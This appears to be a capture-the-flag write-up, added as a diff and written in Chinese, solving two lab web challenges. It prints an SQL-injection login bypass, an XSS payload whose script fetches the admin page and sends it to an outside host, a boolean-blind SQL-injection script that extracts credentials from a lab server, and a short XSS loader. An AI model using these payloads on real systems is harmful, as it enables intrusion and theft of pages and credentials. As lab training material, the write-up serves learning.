@@ -1,0 +1,102 @@
+
+babyxss
+
+输入用户名`111`密码`p'/**/or/**/1=1#`进入
+
+输入payload：
+
+```html
+<script src="https://dev.5dbwat4.top/1.js"></script>
+```
+
+（想上beefXSS但是穿透没配成功）
+
+编辑`1.js`:
+
+```js
+const host="https://dev.5dbwat4.top/"
+
+fetch("/admin.php").then(res => res.text()).then(text => {
+    fetch(`${host}/pl/`+encodeURIComponent(text));
+});
+```
+
+```html
+<html>
+    <head>
+        <title>admin</title>
+        <script>
+            var flag = "AAA{babyxss_0aa1ZnpBIEaJDpDHnzYK}";
+            console.log(flag);
+        </script>
+    </head>
+    <body style="text-align:center">
+        <h1>Welcome, admin</h1>
+        <p>here are all messages:</p>
+        <table border="1" cellpadding="5" style="margin: auto;">
+            <tr>
+                <th>user</th>
+                <th>message</th>
+            </tr>
+                    </table>
+    </body>
+</html>
+```
+
+childxss
+
+`injection? it seems that you have no right acount`
+
+不知道怎么识别的，不过看来我们要获得一个好一点的用户名
+
+可以打一个bool blind，也可以打sleep-based
+
+```js
+const iter = (payload)=>fetch("http://10.214.160.13:12802/login.php", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "en",
+    "cache-control": "no-cache",
+    "content-type": "application/x-www-form-urlencoded",
+    "pragma": "no-cache",
+    "upgrade-insecure-requests": "1",
+    "cookie": "PHPSESSID=568fd69ee3621210ffe3a336b86b323c",
+    "Referer": "http://10.214.160.13:12802/login.html"
+  },
+  "body": "username=111&password="+payload,
+  "method": "POST"
+}).then(res => res.text()).then(text => {
+  if(text.includes("no right acount")){
+    return true;
+  }else if(text.includes("login failed")){
+    return false;
+  }
+  console.log("For payload:",payload,"Unrecognized:",text)
+  return false;
+});
+
+const whichnumber=async(chrfunc)=>{
+    for(let i=0;i<256;i++){
+        if(await iter(chrfunc(i))){
+            console.log("ok,",i,String.fromCharCode(i));
+            return i;
+        }
+    }
+}
+
+(async()=>{
+    for(let i=0;i<50;i++){
+        console.log(await whichnumber(((i)=>(n=>`p'/**/or/**/ASCII(SUBSTRING((select/**/username/**/FROM/**/users/**/limit/**/1)FROM/**/${i}/**/FOR/**/1))=${n}#`))(i)));   
+    }
+    for(let i=0;i<50;i++){
+        console.log(await whichnumber(((i)=>(n=>`p'/**/or/**/ASCII(SUBSTRING((select/**/password/**/FROM/**/users/**/limit/**/1)FROM/**/${i}/**/FOR/**/1))=${n}#`))(i)));   
+    }
+})();
+```
+
+打出来用户名`aaadmin`，密码`123456`
+
+
+下一个难题是36字符XSS
+
+`<script src=//5dbwat4.top></script>`
